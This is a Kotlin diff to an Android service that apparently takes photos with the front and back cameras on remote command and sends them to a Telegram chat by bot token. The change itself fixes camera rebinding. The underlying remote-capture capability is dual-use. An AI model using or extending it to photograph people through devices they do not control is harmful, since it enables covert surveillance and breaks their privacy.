@@ -434,19 +434,29 @@ class LightBotService : LifecycleService() {
     }
 
     private fun captureWithWait(source: String, chatId: String?, quality: String, onDone: (() -> Unit)? = null) {
-        // CameraX always shoots at HIGH; post-processing handles resize/compress.
-        // No rebind needed — stable single-session capture.
-
-        val imgCapture = imageCapture
-        if (cameraProvider == null || imgCapture == null) {
-            Log.e(TAG, "cameraProvider or imageCapture null — cannot capture")
-            if (chatId != null) {
-                TelegramBot.sendText(Config.botToken, chatId, "❌ 相机初始化失败，请稍后重试")
-            }
+        // Re-fetch imageCapture fresh — it may have been replaced by preview/captureFront.
+        // Also re-bind to back camera if a front-camera operation left it in wrong state.
+        if (cameraProvider == null) {
+            Log.e(TAG, "cameraProvider null — cannot capture")
+            if (chatId != null) TelegramBot.sendText(Config.botToken, chatId, "❌ 相机初始化失败，请稍后重试")
             return
         }
-
-        captureWithImageCapture(imgCapture, source, chatId, quality)
+        // Ensure we are bound to back camera; front-preview may have left front bound
+        mainHandler.post {
+            try { cameraProvider?.unbindAll() } catch (_: Exception) {}
+            bindImageCapture()
+        }
+        // Wait for rebind to settle, then capture
+        mainHandler.postDelayed({
+            val imgCapture = imageCapture
+            if (imgCapture == null) {
+                Log.e(TAG, "imageCapture still null after rebind")
+                if (chatId != null) TelegramBot.sendText(Config.botToken, chatId, "❌ 相机初始化失败，请稍后重试")
+                return@postDelayed
+            }
+            captureWithImageCapture(imgCapture, source, chatId, quality)
+            onDone?.invoke()
+        }, 500L)
     }
 
     private fun captureWithImageCapture(imgCapture: ImageCapture, source: String, chatId: String?, quality: String, onDone: (() -> Unit)? = null) {
@@ -615,6 +625,11 @@ class LightBotService : LifecycleService() {
                             TelegramBot.sendPhoto(Config.botToken, chatId, data,
                                 "📷 [${(System.currentTimeMillis() - previewEndTime + 30000) / 1000}s]")
                         } catch (_: Exception) {}
+                        // Restore back camera after front capture
+                        mainHandler.post {
+                            try { cameraProvider?.unbindAll() } catch (_: Exception) {}
+                            bindImageCapture()
+                        }
                     }
                     override fun onError(ex: ImageCaptureException) {}
                 }
